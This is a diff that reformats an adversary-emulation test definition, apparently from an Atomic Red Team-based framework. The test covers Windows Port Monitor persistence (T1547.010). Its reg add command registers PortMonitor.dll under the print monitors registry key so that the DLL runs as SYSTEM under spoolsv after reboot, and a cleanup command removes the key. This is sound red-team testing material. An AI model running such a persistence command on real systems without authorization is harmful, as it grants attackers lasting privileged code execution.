@@ -1,16 +1,17 @@
-- id: f6c8287d-f666-5350-bf87-3869b903033a
+- requirements: []
   name: Soumaia ART Tests - Add Port Monitor persistence in Registry
   description: Add key-value pair to a Windows Port Monitor registry. On the subsequent reboot DLL will be execute under spoolsv with NT AUTHORITY/SYSTEM privilege. (requires elevation)
   tactic: privilege-escalation
-  technique:
-    attack_id: T1547.010
-    name: 'Boot or Logon Autostart Execution: Port Monitors'
-  platforms:
-    windows:
-      cmd:
-        command: |-
-          reg add "hklm\system\currentcontrolset\control\print\monitors\AtomicRedTeam" /v "Driver" /d "$.\PortMonitor.dll" /t REG_SZ /f
-        cleanup: |-
-          reg delete "hklm\system\currentcontrolset\control\print\monitors\AtomicRedTeam" /f >nul 2>&1
-        payloads:
-        - PortMonitor.dll
+  technique_id: T1547.010
+  technique_name: 'Boot or Logon Autostart Execution: Port Monitors'
+  executors:
+  - cleanup:
+    - reg delete "hklm\system\currentcontrolset\control\print\monitors\AtomicRedTeam" /f >nul 2>&1
+    timeout: 60
+    platform: windows
+    name: cmd
+    payloads:
+    - PortMonitor.dll
+    parsers: []
+    command: reg add "hklm\system\currentcontrolset\control\print\monitors\AtomicRedTeam" /v "Driver" /d "$.\PortMonitor.dll" /t REG_SZ /f
+  id: f6c8287d-f666-5350-bf87-3869b903033a
